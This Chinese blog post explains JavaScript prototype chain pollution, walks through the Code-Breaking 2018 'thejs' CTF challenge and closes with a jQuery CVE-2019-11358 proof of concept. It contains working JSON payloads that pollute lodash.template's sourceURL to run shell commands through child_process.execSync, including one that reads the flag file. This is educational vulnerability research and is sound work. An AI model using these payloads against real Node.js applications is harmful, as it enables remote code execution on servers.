</ul>

  </div>
</div>
</div>

<header class="post-header text-center">
	<h1 class="title">
		浅析JavaScript原型链污染攻击
	</h1>
	<span class="read">
		阅读量 <span id="busuanzi_value_page_pv"></span>
	</span>
</header><br>

<div class="book-post">
  <h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="JavaScript构造函数与类"><a href="#JavaScript构造函数与类" class="headerlink" title="JavaScript构造函数与类"></a>JavaScript构造函数与类</h3><p>在JavaScript中，构造函数相当于类，且可以将其实例化。</p>
<p>如果要定义一个类，需要以定义构造函数的方式来定义：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/1.png" alt=""></p>
<p>这里Foo函数的内容，就是Foo类的构造函数，而this.num就是Foo类的一个属性。</p>
<h3 id="JavaScript语法特性"><a href="#JavaScript语法特性" class="headerlink" title="JavaScript语法特性"></a>JavaScript语法特性</h3><p>在介绍JS原型链之前，需要了解下JS中一些访问对象的语法特性。</p>
<p>如图：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/2.png" alt=""></p>
<h3 id="JavaScript原型对象prototype与-proto"><a href="#JavaScript原型对象prototype与-proto" class="headerlink" title="JavaScript原型对象prototype与__proto__"></a>JavaScript原型对象prototype与__proto__</h3><h4 id="原型对象prototype"><a href="#原型对象prototype" class="headerlink" title="原型对象prototype"></a>原型对象prototype</h4><p>原型对象prototype是新对象的模板，它将自身的属性共享给新对象。一个对象不但可以享有自己创建时和运行时定义的属性，而且可以享有原型对象的属性。</p>
<p><strong>所有的JavaScript对象都会从一个原型对象prototype中继承属性和方法。</strong></p>
<p><strong>JavaScript的每一个函数/类都有一个prototype属性，用来指向该构造函数的原型。</strong></p>
<p>下面定义了一个Hacker函数，看到其有prototype属性、指向了该构造函数的原型本身：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/4.png" alt=""></p>
<h4 id="proto-属性"><a href="#proto-属性" class="headerlink" title="__proto__属性"></a>__proto__属性</h4><p><strong>JavaScript的每一个实例对象都有一个__proto__属性指向该实例对象的原型。</strong></p>
<p>下面新建一个Hacker类的实例对象hacker，看到其有__proto__属性，访问该属性可知是指向hacker这个实例对象的原型的：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/5.png" alt=""></p>
<p>观察发现，<strong>实例对象由函数生成，实例对象的__proto__属性是指向函数的prototype属性的</strong>，即：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/6.png" alt=""></p>
<p>接着我们注意到，在前面调用的无论是实例对象的__proto__属性还是构造函数/类的prototype属性，它们均有一个__proto__属性指向Object，而再往下调用__proto__属性就是在调用Object.__proto__、其值为null：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/7.png" alt=""></p>
<p>这个就涉及到后面要讲的原型链的东西了：<strong>所有JavaScript中的对象都是位于原型链顶端的Object的实例，其中实例对象原型的原型是Object.prototype，而它的原型是null，所以Object.prototype就是原型链的最顶端。</strong></p>
<h4 id="constructor属性"><a href="#constructor属性" class="headerlink" title="constructor属性"></a>constructor属性</h4><p>我们知道，构造函数/类的prototype属性指向该函数的原型，相应的该构造函数的原型也有相应的属性指向该构造函数——constructor属性。</p>
<p>每个原型对象都有一个constructor属性，指向相关联的构造函数，所以构造函数和构造函数的prototype即原型是可以相互指向的。实例对象也可以访问constructor属性指向其构造函数。</p>
<h3 id="JavaScript原型链与原型链继承"><a href="#JavaScript原型链与原型链继承" class="headerlink" title="JavaScript原型链与原型链继承"></a>JavaScript原型链与原型链继承</h3><h4 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h4><p>由于__proto__是任何JavaScript对象都有的属性，而JavaScript中万物皆对象，因此会形成一条__proto__连起来的链，递归访问__proto__直至到终点即值为null，这就是原型链。</p>
<p>我们看前面用到的Hacker构造函数和hacker实例对象的例子，其原型链即类实例对象的原型链如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker -&gt; Hacker.prototype -&gt; Object.prototype -&gt; null</span><br></pre></td></tr></table></figure>
<p>这里改下smi1e的图，可以看到Hacker构造函数和hacker实例对象的原型链结构：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/9.png" alt=""></p>
<p>除了类实例对象的原型链，再看看其他的原型链。</p>
<p>数组的原型链：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c -&gt; Array.prototype -&gt; Object.prototype -&gt; null</span><br></pre></td></tr></table></figure>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/10.png" alt=""></p>
<p>日期的原型链：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d -&gt; Date.prototype -&gt; Object.prototype -&gt; null</span><br></pre></td></tr></table></figure>
<p>函数的原型链：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f -&gt; function.prototype -&gt; Object.prototype -&gt; null</span><br></pre></td></tr></table></figure>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/11.png" alt=""></p>
<h4 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h4><p>根据原型链，所有类对象在实例化的时候会拥有prototype中的属性和方法，在原型链上的任何位置设置属性都能被子对象访问到，这个特性被用来实现JavaScript中的继承机制。</p>
<p>当JavaScript引擎查找对象的属性时，会先查找对象本身是否存在该属性，若不存在则会在原型对链上查看、直到找到一个名字匹配的属性或到达原型链的末尾即null。这种查找机制被运用在面向对象的继承中，被称为原型链继承。</p>
<p>比如下面定义了构造函数Person，并创建了一个实例对象：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">first, last, age, eyecolor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.firstName = first;</span><br><span class="line">  <span class="keyword">this</span>.lastName = last;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.eyeColor = eyecolor;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> alan = <span class="keyword">new</span> Person(<span class="string">"Alan"</span>, <span class="string">"Iverson"</span>, <span class="number">18</span>, <span class="string">"blue"</span>);</span><br></pre></td></tr></table></figure>
<p>如果我们想在已定义存在的Person类中直接添加属性是不行的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person.nationality = <span class="string">"English"</span>;</span><br></pre></td></tr></table></figure>
<p>要添加的话只能在该构造函数定义的时候添加上该属性：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">first, last, age, eyecolor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.firstName = first;</span><br><span class="line">  <span class="keyword">this</span>.lastName = last;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.eyeColor = eyecolor;</span><br><span class="line">  <span class="keyword">this</span>.nationality = <span class="string">"English"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果都这样添加的话，实在是太麻烦了。这个时候就能用上原型链继承的方法来轻松实现给示例对象添加新属性的功能：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person.prototype.nationality = <span class="string">"English"</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/8.png" alt=""></p>
<p>总结一下，对于实例对象alan，在调用alan.nationality的时候，实际上JavaScript引擎会进行如下操作：</p>
<ol>
<li>在实例对象alan中寻找nationality；</li>
<li>如果找不到，则在alan.__proto__中寻找nationality；</li>
<li>如果仍然找不到，则继续在alan.__proto__.__proto__中寻找nationality；</li>
<li>依次寻找，直到找到null结束。比如，Object.prototype的__proto__就是null；</li>
</ol>
<h2 id="0x02-JavaScript原型链污染"><a href="#0x02-JavaScript原型链污染" class="headerlink" title="0x02 JavaScript原型链污染"></a>0x02 JavaScript原型链污染</h2><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>在JavaScript中访问一个对象的属性可以用a.b.c或者a[“b”][“c”]来访问。由于对象是无序的，当使用第二种方式访问对象时，只能使用指明下标的方式去访问。因此我们可以通过<code>a[&quot;__proto__&quot;]</code>的方式去访问其原型对象。</p>
<p>原型链污染一般会出现在对象或数组的键名或属性名可控，而且是赋值语句的情况下。</p>
<p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</p>
<h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><p>那么什么场景会出现原型链污染呢？——一般是可以设置__proto__值的场景，即能够控制数组（对象）的键名的操作：</p>
<ul>
<li>对象merge，即合并数组对象的操作；</li>
<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>
</ul>
<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>看个Demo：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hacker是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> hacker = &#123;<span class="attr">name</span>: <span class="string">"mi1k7ea"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hacker.name="mike"</span></span><br><span class="line"><span class="built_in">console</span>.log(hacker.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改hacker的原型（即Object）</span></span><br><span class="line">hacker.__proto__.name = <span class="string">"prototype attack!"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，hacker.name仍然是mi1k7ea</span></span><br><span class="line"><span class="built_in">console</span>.log(hacker.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的user对象</span></span><br><span class="line"><span class="keyword">let</span> user = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看user.name(user.name="prototype attack!")</span></span><br><span class="line"><span class="built_in">console</span>.log(user.name)</span><br></pre></td></tr></table></figure>
<p>可以看到，hacker实例对象本身就存在name属性，而通过hacker.__proto__.name设置的name属性实际就是设置hacker.__proto__指向的Object对象的name属性并进行了赋值，当再输出hacker实例对象的name属性时，由于JS引擎直接在当前hacker上找到该属性而无需继续往上到原型链上寻找name属性；但user实例对象是个空的对象、无任何属性，因此当尝试输出user对象的name属性值时JS引擎会在user对象的原型链上寻找name属性，其中在Object对象上找到了name属性就获取输出出来：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/12.png" alt=""></p>
<p>再看个P神文章中用到的merge()函数的例子，假设有如下的merge()函数定义：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其在合并的过程中，存在赋值的操作target[key] = source[key]。因此，当我们控制target的键key为__proto__时就能污染原型链了。</p>
<p>先试下这个payload：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>
<p>可以看到并未污染成功：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/13.png" alt=""></p>
<blockquote>
<p>这是因为，我们用JavaScript创建o2的过程（let o2 = {a: 1, “<strong>proto</strong>“: {b: 2}}）中，<strong>proto</strong>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，<strong>proto</strong>并不是一个key，自然也不会修改Object的原型。</p>
</blockquote>
<p>因此，我们需要将o2实例对象那部分改为Json格式，如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>
<p>可以看到新建的o3实例对象也存在b属性，说明Object已经被污染了，这样就能成功进行原型链污染攻击了：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/14.png" alt=""></p>
<blockquote>
<p>这是因为，JSON解析的情况下，<strong>proto</strong>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
</blockquote>
<h2 id="0x03-Code-Breaking-2018-Thejs"><a href="#0x03-Code-Breaking-2018-Thejs" class="headerlink" title="0x03 Code-Breaking 2018 Thejs"></a>0x03 Code-Breaking 2018 Thejs</h2><p>这是P神在代码审计中出的一道JS原型链污染题目。</p>
<p>题目环境：<a href="https://github.com/phith0n/code-breaking/tree/master/2018/thejs" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/tree/master/2018/thejs</a></p>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>访问页面，就是让你选两个项，添加之后就会缓存起来：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/15.png" alt=""></p>
<p>Add请求报文如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: http://test.com/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 37</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: grafana_session=37dd397e606027a65d2179c6a4d00d80</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">language%5B%5D=php&amp;category%5B%5D=web</span><br></pre></td></tr></table></figure>
<p>这题是需要进行代码审计的。</p>
<p>这里主要的代码都在server.js中，我们看其中关键部分：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; </span><br><span class="line"><span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>可以看到，这里存在一个用户输入点<code>lodash.merge(data, req.body)</code>，即在请求方法为POST时直接将req.body的值作为lodash.merge()的第二个参数传入，而我们在前面知道merge()函数是合并数组的操作，同时也是原型链污染的常见场景，因此我们可以通过POST方式传入的请求体内容来污染data数组。</p>
<p>在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的lodash.template中。</p>
<p>我们去看下<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165" target="_blank" rel="noopener">lodash.template()</a>的源码吧：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'sourceURL'</span> <span class="keyword">in</span> options ? <span class="string">'//# sourceURL='</span> + options.sourceURL + <span class="string">'\n'</span> : <span class="string">''</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">  .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>options是一个对象，sourceURL取到了其options.sourceURL属性。这个属性原本是没有赋值的，默认取空字符串。</p>
<p>但因为原型链污染，我们可以给所有Object对象中都插入一个sourceURL属性。最后，这个sourceURL被拼接进new Function的第二个参数中，造成任意代码执行漏洞。</p>
</blockquote>
<p>了解一下，Function(arg1,arg2,…,funcbody)，可以建立一个匿名函数：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/16.png" alt=""></p>
<p>而Function.apply(object, args)可以调用该函数，可以理解为<code>object.function(arg1, arg2)，args=[arg1, arg2]</code>：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/17.png" alt=""></p>
<p>再看下attempt是干啥的，在<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/attempt.js" target="_blank" rel="noopener">attemp.js</a>中有定义：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> attempt = baseRest(<span class="function"><span class="keyword">function</span>(<span class="params">func, args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> apply(func, <span class="literal">undefined</span>, args);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> isError(e) ? e : <span class="keyword">new</span> <span class="built_in">Error</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>说到底attempt就是<code>func.apply()</code>，就是执行定义的函数。</p>
<p>那么options是怎么传进来的？我们回到server.js：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line"><span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br></pre></td></tr></table></figure>
<p>这里三个点是将options数组打散为序列的意思。到这我们还是不能确定options是否可控，但这没必要去考虑，因为我们通过原型链污染来污染Object.sourceURL，致使在寻找options.sourceURL时JS引擎还是能成功在options的原型链上找到该属性。</p>
<p>至此，也就是说，当我们通过原型链污染致使options.sourceURL存在值时，程序会将options.sourceURL污染值拼接到Function()的第二个参数中，导致任意代码执行。</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><h4 id="缺陷payload"><a href="#缺陷payload" class="headerlink" title="缺陷payload"></a>缺陷payload</h4><p>根据上述分析，可以通过原型链污染致使Object存在污染进来的sourceURL属性，从而导致options也有sourceURL属性进而任意代码执行。</p>
<p>下面这个是有缺陷的payload：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>: &#123;<span class="attr">"sourceURL"</span>: <span class="string">"\nreturn e =&gt; &#123; return global.process.mainModule.constructor._load('child_process').execSync('ls /')&#125;\n"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>e =&gt; { return ...}</code>是ES6的匿名函数创建语法，相当于：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function(e)&#123; return ...;&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>之所以将sourceURL的返回值定义为“另一个函数”，再由“另一个函数”返回系统命令执行结果，是因为原本的设计<code>Function(importsKeys, sourceURL + &#39;return &#39; + source)</code>中的source就是返回一个function的，因为现在提前return，考虑幂等原理，修改后的返回也要是function</p>
</blockquote>
<p>发送前，注意Content-Type改为application/json：</p>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/18.png" alt=""></p>
<p>虽然能执行命令拿到flag，但是Web页面不能再直接访问了。这是因为只要在程序重启之前，整个原型链都会受到污染带来的影响，导致后面用户因为原型已经被污染而无法获取正常服务。</p>
<h4 id="优化payload"><a href="#优化payload" class="headerlink" title="优化payload"></a>优化payload</h4><p>在上一个基础上，在执行本次命令之前用for循环把之前的污染删掉：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>: &#123;<span class="attr">"sourceURL"</span>: <span class="string">"\nreturn e =&gt; &#123; for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag_thepr0t0js')&#125;\n"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>此时的Web服务能正常访问。</p>
<h2 id="0x04-jQuery原型污染漏洞（CVE-2019-11358）"><a href="#0x04-jQuery原型污染漏洞（CVE-2019-11358）" class="headerlink" title="0x04 jQuery原型污染漏洞（CVE-2019-11358）"></a>0x04 jQuery原型污染漏洞（CVE-2019-11358）</h2><p>在jQuery &lt; 3.4.0的版本中存在原型污染漏洞。</p>
<p>下面参考奇安信的漏洞分析。</p>
<p>在./src/core.js第155行中，options取传入的参数 arguments[i]：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((options = <span class="built_in">arguments</span>[ i ]) != <span class="literal">null</span>) &#123;</span><br></pre></td></tr></table></figure>
<p>而后在第158 、159 行中，将options遍历赋值给copy，即copy外部可控：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (name <span class="keyword">in</span> options) &#123;    copy= options [name];</span><br></pre></td></tr></table></figure>
<p>接着，在第167-185行中，判断copy是否是数组；若是，则调用jQuery.extend()函数，该函数用于将一个或多个对象的内容合并到目标对象，这里是将外部可控的copy数组扩展到target数组中；若copy非数组而是个对象，则直接将copy变量值赋值给target[name]：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Recurse if we're merging plain objects or arraysif ( deep &amp;&amp; copy &amp;&amp; ( jQuery.isPlainObject( copy ) || ( copyIsArray = Array.isArray( copy ) ) ) ) &#123;    ...    // Never move original objects, clone them    target[ name ] = jQuery.extend( deep, clone, copy );    // Don't bring in undefined values&#125; else if ( copy !== undefined ) &#123;    target[ name ] = copy;&#125;</span></span><br></pre></td></tr></table></figure>
<p>此时，如果name可以被设置为<code>__proto__</code>，则会向上影响target的原型，进而覆盖造成原型污染。</p>
<p>往前面找，在第127行中可以看到，target数组是取传入的参数arguments[0]：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="built_in">arguments</span>[ <span class="number">0</span> ] || &#123;&#125;,</span><br></pre></td></tr></table></figure>
<p>也就是说，target变量可以通过外部传入的参数arguments数组的第一个元素来设置target数组的键name对应的值为<code>__proto__</code>，而options变量可通过外部传入的参数arguments[i]进行赋值，copy变量又是由options遍历赋值的，进而导致copy变量外部可控，最后会将copy合入或赋值到target数组中，因此当<code>target[__proto__]=外部可控的copy</code>时就存在原型污染漏洞了。</p>
<p>简单地说，就是target[name]=copy的赋值语句两边均可控，导致JS原型污染漏洞的存在。</p>
<p>因此可以构造如下PoC来验证，先引入漏洞版本的jQuery，再进行JS原型污染攻击：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jquery = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);  jquery.src = <span class="string">'https://code.jquery.com/jquery-3.3.1.min.js'</span>;<span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(jquery);<span class="keyword">let</span> a = $.extend(<span class="literal">true</span>, &#123;&#125;, <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"__proto__": &#123;"devMode":"Hacked By Mi1k7ea"&#125;&#125;'</span>))<span class="built_in">console</span>.log(&#123;&#125;.devMode);</span><br></pre></td></tr></table></figure>
<p><img src="/2019/10/20/浅析JavaScript原型链污染攻击/3.png" alt=""></p>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">深入理解 JavaScript Prototype 污染攻击</a></p>
